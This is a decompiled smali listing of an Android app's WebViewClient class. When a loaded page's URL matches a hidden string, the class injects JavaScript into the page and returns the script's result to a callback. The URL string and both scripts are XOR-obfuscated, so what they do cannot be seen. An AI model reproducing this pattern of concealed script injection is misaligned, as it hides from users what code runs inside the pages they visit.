.class Lsigma/male/MainActivity$1;
.super Landroid/webkit/WebViewClient;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/MainActivity;->initialize(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lsigma/male/MainActivity;


# direct methods
.method constructor <init>(Lsigma/male/MainActivity;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/MainActivity$1;->this$0:Lsigma/male/MainActivity;

    .line 191
    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;
    .locals 1

    .prologue
    .line 191
    iget-object v0, p0, Lsigma/male/MainActivity$1;->this$0:Lsigma/male/MainActivity;

    return-object v0
.end method


# virtual methods
.method public onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
    .locals 3

    .prologue
    .line 201
    .line 202
    const-string v0, "PSAyXUtve2laTyJ6L0NLITUhX1k4eiVCVXo="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 203
    iget-object v0, p0, Lsigma/male/MainActivity$1;->this$0:Lsigma/male/MainActivity;

    invoke-static {v0}, Lsigma/male/MainActivity;->access$2(Lsigma/male/MainActivity;)Landroid/webkit/WebView;

    move-result-object v0

    const-string v1, "PzUwTEs2Ji9dTG98IFhWNiAvQlZ9fT1eXSEdKFldJyInQRB1fG8NBWt0PVtZJ3QzXkpodCJCWyA5I0NMezMjWX05MStIViEnBFR2NDkjBR8gJyNfVjQ5IwoRDmQbA040ODNIA3UiJ18YICQnXktodCJCWyA5I0NMezMjWX05MStIViEnBFR2NDkjBR8lNTVeTzomIgoRDmQbA040ODNIA3V0B0NcJzsvSRYmPClabDo1NVkQcgE1SEo7NStIAnhzZgZNJiZtChgFNTVeAnh0YQYYICQnXkt8KWoYCGV9fVARfX0="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 205
    :cond_0
    iget-object v0, p0, Lsigma/male/MainActivity$1;->this$0:Lsigma/male/MainActivity;

    invoke-static {v0}, Lsigma/male/MainActivity;->access$2(Lsigma/male/MainActivity;)Landroid/webkit/WebView;

    move-result-object v0

    .line 206
    const-string v1, "fTIzQ1shPSlDEHx0PQ1KMCAzX1Z1fGERUCE5KhMffjApTk04MShZFjIxMmhUMDkjQ0wmFj95WTIaJ0BdfXMuWVU5c292CAh6L0NWMCYOeXUZf2ERFz0gK0EGcn19DUV8fG8W"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 207
    new-instance v2, Lsigma/male/MainActivity$1$1;

    invoke-direct {v2, p0}, Lsigma/male/MainActivity$1$1;-><init>(Lsigma/male/MainActivity$1;)V

    .line 205
    invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V

    .line 222
    invoke-super {p0, p1, p2}, Landroid/webkit/WebViewClient;->onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V

    .line 223
    return-void
.end method

.method public onPageStarted(Landroid/webkit/WebView;Ljava/lang/String;Landroid/graphics/Bitmap;)V
    .locals 0

    .prologue
    .line 196
    invoke-super {p0, p1, p2, p3}, Landroid/webkit/WebViewClient;->onPageStarted(Landroid/webkit/WebView;Ljava/lang/String;Landroid/graphics/Bitmap;)V

    .line 197
    return-void
.end method
